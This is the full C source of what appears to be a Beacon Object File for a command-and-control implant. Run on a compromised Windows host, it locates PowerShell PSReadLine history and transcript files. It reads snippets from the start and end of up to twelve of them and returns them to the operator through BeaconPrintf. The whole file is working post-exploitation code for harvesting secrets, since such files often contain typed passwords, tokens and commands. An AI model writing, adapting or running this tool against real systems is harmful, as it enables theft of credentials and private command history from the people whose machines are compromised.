#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <stddef.h>

#ifndef DECLSPEC_IMPORT
#ifdef _WIN32
#define DECLSPEC_IMPORT __declspec(dllimport)
#else
#define DECLSPEC_IMPORT
#endif
#endif

#ifndef WINAPI
#ifdef _WIN32
#define WINAPI __stdcall
#else
#define WINAPI
#endif
#endif

#ifndef HANDLE
typedef void *HANDLE;
#endif
#ifndef DWORD
typedef unsigned long DWORD;
#endif
#ifndef LONG
typedef long LONG;
#endif
#ifndef BOOL
typedef int BOOL;
#endif
#ifndef BYTE
typedef unsigned char BYTE;
#endif
#ifndef LPVOID
typedef void *LPVOID;
#endif
#ifndef LPCVOID
typedef const void *LPCVOID;
#endif
#ifndef LPCWSTR
typedef const unsigned short *LPCWSTR;
#endif
#ifndef LPWSTR
typedef unsigned short *LPWSTR;
#endif
#ifndef LPDWORD
typedef DWORD *LPDWORD;
#endif

#ifndef _WCHAR_T_DEFINED
typedef unsigned short wchar_t;
#define _WCHAR_T_DEFINED
#endif

#include "beacon.h"

#define INVALID_HANDLE_VALUE ((HANDLE)(long long)-1)
#define INVALID_FILE_ATTRIBUTES ((DWORD)0xFFFFFFFF)
#define FILE_ATTRIBUTE_DIRECTORY 0x00000010
#define OPEN_EXISTING 3
#define GENERIC_READ 0x80000000
#define FILE_SHARE_READ 0x00000001
#define FILE_SHARE_WRITE 0x00000002
#define FILE_SHARE_DELETE 0x00000004
#define FILE_BEGIN 0
#define INVALID_SET_FILE_POINTER ((DWORD)0xFFFFFFFF)

#define MAX_PATH_LEN 260
#define MAX_SNIPPET_BYTES 480
#define MAX_FILES_TOTAL 12
#define MAX_FILES_PER_PATTERN 6

typedef struct {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
} FILETIME;

typedef struct {
    DWORD dwFileAttributes;
    FILETIME ftCreationTime;
    FILETIME ftLastAccessTime;
    FILETIME ftLastWriteTime;
    DWORD nFileSizeHigh;
    DWORD nFileSizeLow;
} WIN32_FILE_ATTRIBUTE_DATA;

typedef struct {
    DWORD dwFileAttributes;
    DWORD ftCreationTime_dwLowDateTime;
    DWORD ftCreationTime_dwHighDateTime;
    DWORD ftLastAccessTime_dwLowDateTime;
    DWORD ftLastAccessTime_dwHighDateTime;
    DWORD ftLastWriteTime_dwLowDateTime;
    DWORD ftLastWriteTime_dwHighDateTime;
    DWORD nFileSizeHigh;
    DWORD nFileSizeLow;
    DWORD dwReserved0;
    DWORD dwReserved1;
    wchar_t cFileName[260];
    wchar_t cAlternateFileName[14];
} WIN32_FIND_DATAW;

DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetFileAttributesW(LPCWSTR lpFileName);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$ExpandEnvironmentStringsW(LPCWSTR lpSrc, LPWSTR lpDst, DWORD nSize);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$FindFirstFileW(LPCWSTR lpFileName, WIN32_FIND_DATAW *lpFindFileData);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$FindNextFileW(HANDLE hFindFile, WIN32_FIND_DATAW *lpFindFileData);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$FindClose(HANDLE hFindFile);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$GetFileAttributesExW(LPCWSTR lpFileName, int fInfoLevelId, LPVOID lpFileInformation);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPVOID lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$SetFilePointer(HANDLE hFile, LONG lDistanceToMove, LONG *lpDistanceToMoveHigh, DWORD dwMoveMethod);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPVOID lpOverlapped);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, size_t dwSize, DWORD flAllocationType, DWORD flProtect);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, size_t dwSize, DWORD dwFreeType);

#define MEM_COMMIT     0x00001000
#define MEM_RESERVE    0x00002000
#define MEM_RELEASE    0x00008000
#define PAGE_READWRITE 0x04

#define WS_PAGE_SIZE   4096

#define WS_EXPANDED    0
#define WS_FULLPATH    520
#define WS_DIRPATH     1040
#define WS_FINDDATA    1560
#define WS_PARENT      2152
#define WS_SNIPPET     2672
#define WS_ATTR        3154

typedef struct {
    int found_psreadline;
    int found_transcript;
    int files_processed;
    int read_errors;
} scan_results_t;

static const wchar_t *k_psreadline_paths[] = {
    L"%APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
    L"%APPDATA%\\Microsoft\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
};

static const wchar_t *k_transcript_patterns[] = {
    L"%USERPROFILE%\\Documents\\PowerShell_transcript*.txt",
    L"%USERPROFILE%\\Documents\\PowerShell\\Transcripts\\*.txt",
    L"%USERPROFILE%\\My Documents\\PowerShell_transcript*.txt"
};

static void *inline_memset(void *dest, int value, size_t count) {
    unsigned char *d = (unsigned char *)dest;
    while (count--) {
        *d++ = (unsigned char)value;
    }
    return dest;
}

static int wide_len(const wchar_t *s) {
    int n = 0;
    if (!s) {
        return 0;
    }
    while (s[n]) {
        n++;
    }
    return n;
}

static int append_wide(const wchar_t *left, const wchar_t *right, wchar_t *out, size_t out_size) {
    size_t i = 0;
    size_t idx = 0;
    if (!left || !right || !out || out_size == 0) {
        return 0;
    }
    while (left[i] && idx + 1 < out_size) {
        out[idx++] = left[i++];
    }
    i = 0;
    while (right[i] && idx + 1 < out_size) {
        out[idx++] = right[i++];
    }
    out[idx] = L'\0';
    return 1;
}

static int extract_parent_dir(const wchar_t *path, wchar_t *parent, size_t parent_len) {
    int i;
    int last_sep = -1;
    if (!path || !parent || parent_len == 0) {
        return 0;
    }
    i = 0;
    while (path[i]) {
        if (path[i] == L'\\' || path[i] == L'/') {
            last_sep = i;
        }
        i++;
    }
    if (last_sep <= 0 || (size_t)last_sep >= parent_len) {
        return 0;
    }
    for (i = 0; i < last_sep; i++) {
        parent[i] = path[i];
    }
    parent[last_sep] = L'\0';
    return 1;
}

static void sanitize_snippet(char *buf, DWORD len) {
    DWORD i;
    for (i = 0; i < len; i++) {
        unsigned char c = (unsigned char)buf[i];
        if (c == '\r' || c == '\n') {
            continue;
        }
        if (c == '\t') {
            buf[i] = ' ';
            continue;
        }
        if (c < 32 || c > 126) {
            buf[i] = '.';
        }
    }
}

static void print_snippet_block(const char *label, const char *buf, DWORD len) {
    char line[128];
    DWORD i = 0;
    DWORD line_len = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "[i]   %s: (%lu bytes)\n", label, (unsigned long)len);
    if (!buf || !buf[0]) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i]     <empty>\n");
        return;
    }

    while (buf[i]) {
        char c = buf[i++];
        if (c == '\r') {
            continue;
        }
        if (c == '\n') {
            line[line_len] = '\0';
            BeaconPrintf(CALLBACK_OUTPUT, "[i]     %s\n", line);
            line_len = 0;
            continue;
        }
        if (line_len + 1 >= sizeof(line)) {
            line[line_len] = '\0';
            BeaconPrintf(CALLBACK_OUTPUT, "[i]     %s\n", line);
            line_len = 0;
        }
        line[line_len++] = c;
    }

    if (line_len > 0) {
        line[line_len] = '\0';
        BeaconPrintf(CALLBACK_OUTPUT, "[i]     %s\n", line);
    }
}

static int read_snippet_ascii_at(LPCWSTR path, unsigned long long start_offset, char *out, DWORD out_size, DWORD *bytes_out) {
    HANDLE h;
    LONG offset_high;
    DWORD offset_low;
    DWORD bytes_read = 0;
    if (!path || !out || out_size < 2 || !bytes_out) {
        return 0;
    }
    *bytes_out = 0;
    out[0] = '\0';
    h = KERNEL32$CreateFileW(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        return 0;
    }
    offset_high = (LONG)(start_offset >> 32);
    offset_low = (DWORD)(start_offset & 0xFFFFFFFF);
    if (start_offset != 0 && KERNEL32$SetFilePointer(h, (LONG)offset_low, &offset_high, FILE_BEGIN) == INVALID_SET_FILE_POINTER && offset_high == -1) {
        KERNEL32$CloseHandle(h);
        return 0;
    }
    if (!KERNEL32$ReadFile(h, out, out_size - 1, &bytes_read, NULL)) {
        KERNEL32$CloseHandle(h);
        return 0;
    }
    KERNEL32$CloseHandle(h);
    sanitize_snippet(out, bytes_read);
    out[bytes_read] = '\0';
    *bytes_out = bytes_read;
    return 1;
}

static void print_file_report(LPCWSTR path, const char *label, scan_results_t *results, char *ws) {
    WIN32_FILE_ATTRIBUTE_DATA *attr = (WIN32_FILE_ATTRIBUTE_DATA *)(ws + WS_ATTR);
    char *snippet = ws + WS_SNIPPET;
    DWORD start_read_bytes = 0;
    DWORD end_read_bytes = 0;
    unsigned long long size = 0;
    unsigned long long end_offset = 0;

    if (!path || !label || !results) {
        return;
    }

    inline_memset(attr, 0, sizeof(WIN32_FILE_ATTRIBUTE_DATA));
    if (!KERNEL32$GetFileAttributesExW(path, 0, attr)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] %s: metadata unavailable: %S\n", label, path);
        results->read_errors++;
        return;
    }

    size = ((unsigned long long)attr->nFileSizeHigh << 32) | (unsigned long long)attr->nFileSizeLow;

    BeaconPrintf(CALLBACK_OUTPUT, "[+] %s: %S\n", label, path);
    BeaconPrintf(CALLBACK_OUTPUT, "[i]   Size: %llu bytes\n", size);

    inline_memset(snippet, 0, MAX_SNIPPET_BYTES + 1);
    if (read_snippet_ascii_at(path, 0, snippet, MAX_SNIPPET_BYTES + 1, &start_read_bytes) && start_read_bytes > 0) {
        print_snippet_block("start", snippet, start_read_bytes);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[!]   Start snippet unavailable\n");
        results->read_errors++;
        results->files_processed++;
        return;
    }

    inline_memset(snippet, 0, MAX_SNIPPET_BYTES + 1);
    if (size > MAX_SNIPPET_BYTES) {
        end_offset = size - MAX_SNIPPET_BYTES;
    }
    if (read_snippet_ascii_at(path, end_offset, snippet, MAX_SNIPPET_BYTES + 1, &end_read_bytes) && end_read_bytes > 0) {
        print_snippet_block("end", snippet, end_read_bytes);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[!]   End snippet unavailable\n");
        results->read_errors++;
    }

    results->files_processed++;
}

static void process_psreadline_candidates(scan_results_t *results, char *ws) {
    wchar_t *expanded = (wchar_t *)(ws + WS_EXPANDED);
    size_t i;
    for (i = 0; i < (sizeof(k_psreadline_paths) / sizeof(k_psreadline_paths[0])); i++) {
        DWORD needed;
        DWORD attr;

        if (results->files_processed >= MAX_FILES_TOTAL) {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] File cap reached while scanning PSReadLine candidates\n");
            return;
        }

        inline_memset(expanded, 0, MAX_PATH_LEN * sizeof(wchar_t));
        needed = KERNEL32$ExpandEnvironmentStringsW(k_psreadline_paths[i], expanded, MAX_PATH_LEN);
        if (needed == 0 || needed > MAX_PATH_LEN) {
            continue;
        }

        attr = KERNEL32$GetFileAttributesW(expanded);
        if (attr == INVALID_FILE_ATTRIBUTES || (attr & FILE_ATTRIBUTE_DIRECTORY)) {
            continue;
        }

        print_file_report(expanded, "PSReadLine history", results, ws);
        results->found_psreadline++;
    }

    if (results->found_psreadline == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] No PSReadLine history file found in default APPDATA paths\n");
    }
}

static void process_transcript_patterns(scan_results_t *results, char *ws) {
    wchar_t *expanded = (wchar_t *)(ws + WS_EXPANDED);
    WIN32_FIND_DATAW *fd = (WIN32_FIND_DATAW *)(ws + WS_FINDDATA);
    wchar_t *full_path = (wchar_t *)(ws + WS_FULLPATH);
    wchar_t *dir_path = (wchar_t *)(ws + WS_DIRPATH);
    size_t i;
    for (i = 0; i < (sizeof(k_transcript_patterns) / sizeof(k_transcript_patterns[0])); i++) {
        HANDLE hfind;
        int files_for_pattern = 0;

        if (results->files_processed >= MAX_FILES_TOTAL) {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] File cap reached while scanning transcript patterns\n");
            return;
        }

        inline_memset(expanded, 0, MAX_PATH_LEN * sizeof(wchar_t));
        if (KERNEL32$ExpandEnvironmentStringsW(k_transcript_patterns[i], expanded, MAX_PATH_LEN) == 0) {
            continue;
        }

        inline_memset(fd, 0, sizeof(WIN32_FIND_DATAW));
        hfind = KERNEL32$FindFirstFileW(expanded, fd);
        if (hfind == INVALID_HANDLE_VALUE) {
            continue;
        }

        do {
            int name_len;
            int j;

            if (results->files_processed >= MAX_FILES_TOTAL || files_for_pattern >= MAX_FILES_PER_PATTERN) {
                break;
            }
            if (fd->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                continue;
            }

            inline_memset(full_path, 0, MAX_PATH_LEN * sizeof(wchar_t));
            inline_memset(dir_path, 0, MAX_PATH_LEN * sizeof(wchar_t));

            if (!extract_parent_dir(expanded, dir_path, MAX_PATH_LEN)) {
                continue;
            }
            if (!append_wide(dir_path, L"\\", full_path, MAX_PATH_LEN)) {
                continue;
            }
            name_len = wide_len(fd->cFileName);
            if (name_len <= 0) {
                continue;
            }
            j = 0;
            while (fd->cFileName[j] && full_path[0] && j < name_len) {
                int idx = wide_len(full_path);
                if (idx + 1 >= MAX_PATH_LEN) {
                    break;
                }
                full_path[idx] = fd->cFileName[j];
                full_path[idx + 1] = L'\0';
                j++;
            }
            if (j != name_len) {
                continue;
            }

            print_file_report(full_path, "Transcript", results, ws);
            results->found_transcript++;
            files_for_pattern++;
        } while (KERNEL32$FindNextFileW(hfind, fd));

        KERNEL32$FindClose(hfind);
    }

    if (results->found_transcript == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] No transcript files found in default Documents paths\n");
    }
}

void go(char *args, unsigned long alen) {
    datap parser = {0};
    scan_results_t results;
    char *ws;

    BeaconDataParse(&parser, args, (int)alen);
    inline_memset(&results, 0, sizeof(results));

    ws = (char *)KERNEL32$VirtualAlloc(NULL, WS_PAGE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!ws) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] VirtualAlloc failed\n");
        return;
    }

    process_psreadline_candidates(&results, ws);
    process_transcript_patterns(&results, ws);

    KERNEL32$VirtualFree(ws, 0, MEM_RELEASE);

    BeaconPrintf(
        CALLBACK_OUTPUT,
        "\n[i] Summary: %d PSReadLine, %d transcripts, %d errors\n",
        results.found_psreadline,
        results.found_transcript,
        results.read_errors
    );
}
